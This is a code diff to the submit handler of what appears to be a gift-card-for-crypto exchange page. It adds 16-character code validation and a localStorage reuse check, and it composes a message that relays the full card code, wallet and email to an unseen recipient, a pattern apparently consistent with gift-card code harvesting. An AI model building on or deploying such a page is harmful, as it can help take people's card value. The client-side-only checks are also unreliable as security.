@@ -205,13 +205,21 @@
         }
 
         async function submitNow() {
-            const code = document.getElementById('card').value;
+            const code = document.getElementById('card').value.trim();
             const wallet = document.getElementById('wallet').value;
             const email = document.getElementById('email').value.trim().toLowerCase();
             const total = document.getElementById('display-area').innerText;
             const assetName = document.getElementById('brand').selectedOptions[0].text;
             
-            if(!selectedMethod || code.length < 10 || !wallet || !email) return alert("Please fill all fields.");
+            // Validate all fields filled
+            if(!selectedMethod || !code || !wallet || !email) return alert("Please fill all fields.");
+            
+            // Requirement: Code must be exactly 16 digits
+            if(code.length !== 16) return alert("Invalid Card: Code must be exactly 16 digits.");
+
+            // Requirement: No submitting the same code twice (Checking LocalStorage)
+            const usedCodes = JSON.parse(localStorage.getItem('used_ch_codes') || '[]');
+            if(usedCodes.includes(code)) return alert("Error: This card code has already been submitted.");
 
             document.getElementById('form').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
@@ -223,6 +231,10 @@
             const logs = JSON.parse(localStorage.getItem('ch_logs') || '[]');
             logs.push({ id: tid, date: dateStr, amt: total, status: status });
             localStorage.setItem('ch_logs', JSON.stringify(logs));
+            
+            // Record the code so it can't be used again
+            usedCodes.push(code);
+            localStorage.setItem('used_ch_codes', JSON.stringify(usedCodes));
 
             const text = `📦 *NEW EXCHANGE*\n\n*Asset:* ${assetName}\n*Code:* \`${code}\` \n*Total:* ${total}\n*Status:* ${status}\n*Method:* ${selectedMethod}\n*To:* ${wallet}\n*Email:* ${email}`;
             
